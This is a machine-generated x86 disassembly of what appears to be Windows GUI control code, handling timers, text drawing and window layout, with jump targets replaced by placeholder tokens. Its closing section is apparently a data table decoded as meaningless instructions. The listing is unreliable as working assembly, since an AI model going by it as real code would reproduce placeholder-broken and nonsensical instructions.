sub_42f3f8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42f4a4
mov eax [ esi + 0x34 ]
call sub_420dd8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42f430
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42f46a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f4a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42f523
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f52a
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
sub_42f57c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448868
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
add esp 0xfffffff0
call sub_403570
mov edx 0xb9
mov eax esi
call sub_43fb80
mov edx 0x29
mov eax esi
call sub_43fba4
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42f9cc
mov edx 0x1
mov eax esi
call sub_42f9e8
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_440564
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_446e78
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42f640
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443a38
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42f6b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4461c4
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44414c
sub_42f6f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f7e0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4403c4
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_445088
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f7e7
lea eax [ ebp - 0x14 ]
call sub_403f9c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_446be4
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_446be4
push eax
call InvalidateRect
sub_42f7f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42f828
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f98a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42eeec
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42f7f0
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42eeec
mov esi [ ebx + 0x208 ]
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
push ebp
call sub_42f7f0
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42eeec
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423720
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_423ac4
mov eax ebx
call sub_447de4
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_4426a4
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x1c ]
call sub_40445c
push eax
mov eax esi
call sub_423e68
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f991
lea eax [ ebp - 0x1c ]
call sub_403f9c
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_42383c
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_423d88
mov edx r-xdata
mov eax esi
call sub_423ce4
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42fa3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442c18
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42fa94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445840
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42fbb5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445840
call sub_403a84
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43fba4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43fb80
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42fbd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44772c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42fbfc
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_447dec
pop esi
pop ebx
retn
sub_42fda0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_437a3c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_41a0dc
xor edx edx
mov eax edi
call sub_4402e4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_440538
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_4301d0
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42fe24
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_41a37c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42fe5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42fec1
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437d3c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42fec6
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42feec
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_445b90
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403448
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42ff2c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4459d8
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403448
pop edx
pop esi
pop ebx
retn
sub_42ff58
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_435c98
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_430208
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42ffe8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43027c
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_40324c
mov eax [ esi + 0x210 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4488c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_430038
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_422f68
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4301c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_446be4
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_4402e4
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43fdc8
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_41a238
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403448
test al al
je r-xdata
sub_4301d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41a294
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43ffd0
mov eax ebx
mov si 0xffeb
call sub_403448
sub_430208
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_430380
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_43027c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42fda0
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_41a320
call sub_40324c
pop edi
pop esi
pop ebx
retn
sub_4302bc
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_430038
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4302f4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_41a238
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_41a238
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_430380
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430449
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_43027c
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_430038
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430450
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_41a238
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41a238
pop edx
call sub_4403f4
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_430458
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_446098
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_41a238
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_4304cc
push 0x290047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] ch
add [ eax ] al
push 0x2d0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax ] dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x150047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax ] bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax ] al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x50047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax ] cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx ] cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx ] cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx ] cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ esi ] cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi ] cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] bh
sub al [ edi ]
cmp al 0x6
inc ebx
add [ eax ] dh
sub al [ edi ]
xor al 0x6
inc ebx
add [ eax ] ch
sub al [ edi ]
sub al 0x6
inc ebx
add [ eax ] ah
sub al [ edi ]
and al 0x6
inc ebx
add [ eax ] bl
sub al [ edi ]
sbb al 0x6
inc ebx
add [ eax ] dl
sub al [ edi ]
adc al 0x6
inc ebx
add [ eax ] cl
sub al [ edi ]
or al 0x6
inc ebx
add [ eax ] al
sub al [ edi ]
add al 0x6
inc ebx
add al bh
sub [ edi ] eax
cld
add eax 0x29f00043
inc edi
add ah dh
add eax 0x29e80043
inc edi
add ah ch
add eax 0x29e00043
inc edi
add ah ah
add eax 0x29d80043
inc edi
add ah bl
add eax 0x29d00043
inc edi
add ah dl
add eax 0x29c80043
inc edi
add ah cl
add eax 0x29c00043
inc edi
add ah al
add eax 0x29b80043
inc edi
add [ ebp + eax + 0x29b00043 ] bh
inc edi
add [ ebp + eax + 0x29a80043 ] dh
inc edi
add [ ebp + eax + 0x29a00043 ] ch
inc edi
add [ ebp + eax + 0x29980043 ] ah
inc edi
add [ ebp + eax + 0x29900043 ] bl
inc edi
add [ ebp + eax + 0x29880043 ] dl
inc edi
add [ ebp + eax + 0x29800043 ] cl
inc edi
add [ ebp + eax + 0x29780043 ] al
inc edi
add [ ebp + eax + 0x43 ] bh
add [ eax + 0x29 ] dh
inc edi
add [ ebp + eax + 0x43 ] dh
add [ eax + 0x29 ] ch
inc edi
add [ ebp + eax + 0x43 ] ch
add [ eax + 0x29 ] ah
inc edi
add [ ebp + eax + 0x43 ] ah
add [ eax + 0x29 ] bl
inc edi
add [ ebp + eax + 0x43 ] bl
add [ eax + 0x29 ] dl
inc edi
add [ ebp + eax + 0x43 ] dl
add [ eax + 0x29 ] cl
inc edi
add [ ebp + eax + 0x43 ] cl
add [ eax + 0x29 ] al
inc edi
add [ ebp + eax + 0x43 ] al
add [ eax ] bh
sub [ edi ] eax
cmp al 0x5
inc ebx
add [ eax ] dh
